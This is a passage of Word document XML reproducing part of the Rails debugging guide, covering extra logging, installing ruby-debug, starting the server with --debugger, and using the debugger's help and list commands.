          <w:p w14:paraId="4884D592" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> "created_at") VALUES('2008-09-08 14:52:54', 'Debugging Rails',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B022206" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> 'I''m learning how to print in logs!!!', 'f', '2008-09-08 14:52:54')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BE00DCF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>The post was saved and now the user is going to be redirected...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D7E7892" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Redirected to #&lt;Post:0x20af760&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67E43F9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Completed in 0.01224 (81 reqs/sec) | DB: 0.00044 (3%) | 302 Found [</w:t>
            </w:r>
            <w:hyperlink r:id="rId780" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://localhost/posts</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F786EA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Adding extra logging like this makes it easy to search for unexpected or unusual behavior in your logs. If you add extra logging, be sure to make sensible use of log levels, to avoid filling your production logs with useless trivia.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A391DE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3 Debugging with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ruby-debug</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3C49A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When your code is behaving in unexpected ways, you can try printing to logs or the console to diagnose the problem. Unfortunately, there are times when this sort of error tracking is not effective in finding the root cause of a problem. When you actually need to journey into your running source code, the debugger is your best companion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE1A038" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The debugger can also help you if you want to learn about the Rails source code but don’t know where to start. Just debug any request to your application and use this guide to learn how to move from the code you have written deeper into Rails code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCC726B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774E1FE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The debugger used by Rails, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ruby-debug</w:t>
      </w:r>
      <w:r>
        <w:t>, comes as a gem. To install it, just run:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="023FCB29" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B2AC121" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="148862879"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ sudo gem install ruby-debug</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="646191E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you are using Ruby 1.9, you can install a compatible version of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ruby-debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by running </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sudo gem install ruby-debug19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2712A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In case you want to download a particular version or get the source code, refer to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId781" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>project’s page on rubyforge</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C026E74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails has had built-in support for ruby-debug since Rails 2.0. Inside any Rails application you can invoke the debugger by calling the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debugger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545401F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Here’s an example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5448"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5B119411" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35DBAEC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PeopleController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47CBF608" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76AA7B87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0551D618" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @person</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Person.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F8F0780" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D1F767E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C6A3747" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you see the message in the console or logs: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1DFB4A9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21D7763D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2146190976"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>***** Debugger requested, but was not available: Start server with --debugger to enable *****</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E22A191" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Make sure you have started your web server with the option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>--debugger</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6327"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0A57FFFC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="719D2046" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails server --debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33EC0D26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Booting WEBrick</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01C13E0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">=&gt; Rails 3.0.0 application starting on </w:t>
            </w:r>
            <w:hyperlink r:id="rId782" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://0.0.0.0:3000</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w14:paraId="6D764AFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Debugger enabled</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E27DD0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D042C4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In development mode, you can dynamically </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>require \'ruby-debug\'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead of restarting the server, if it was started without </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>--debugger</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54248A4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 The Shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DA570F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As soon as your application calls the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debugger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method, the debugger will be started in a debugger shell inside the terminal window where you launched your application server, and you will be placed at ruby-debug’s prompt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(rdb:n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the thread number. The prompt will also show you the next line of code that is waiting to run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4A9EF0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you got there by a browser request, the browser tab containing the request will be hung until the debugger has finished and the trace has finished processing the entire request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C0116A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="240B80F3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B68DA24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@posts = Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50854742" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:7)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="685EB92D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now it’s time to explore and dig into your application. A good place to start is by asking the debugger for help… so type: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>help</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (You didn’t see that coming, right?)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2970584" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14F2D774" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:7) help</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43404A64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ruby-debug help v0.10.2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1472C296" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Type 'help &lt;command-name&gt;' for help on a specific command</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="119FA952" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="352F6470" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Available commands:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="762CF89F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>backtrace  delete   enable  help    next  quit     show    trace</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="364AE718" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>break      disable  eval    info    p     reload   source  undisplay</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72905CF5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>catch      display  exit    irb     pp    restart  step    up</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="274B09A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>condition  down     finish  list    ps    save     thread  var</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04BE462E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>continue   edit     frame   method  putl  set      tmate   where</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46BB5246" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To view the help menu for any command use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>help &lt;command-name&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in active debug mode. For example: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>help var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B501F8C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next command to learn is one of the most useful: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can also abbreviate ruby-debug commands by supplying just enough letters to distinguish them from other commands, so you can also use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD708B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This command shows you where you are in the code by printing 10 lines centered around the current line; the current line in this particular case is line 6 and is marked by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3BFEBE67" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33761991" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:7) list</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54BF956F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 10] in /PathToProject/posts_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54D4A149" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   1  class PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C3C3ED0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   2    # GET /posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E42B4D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
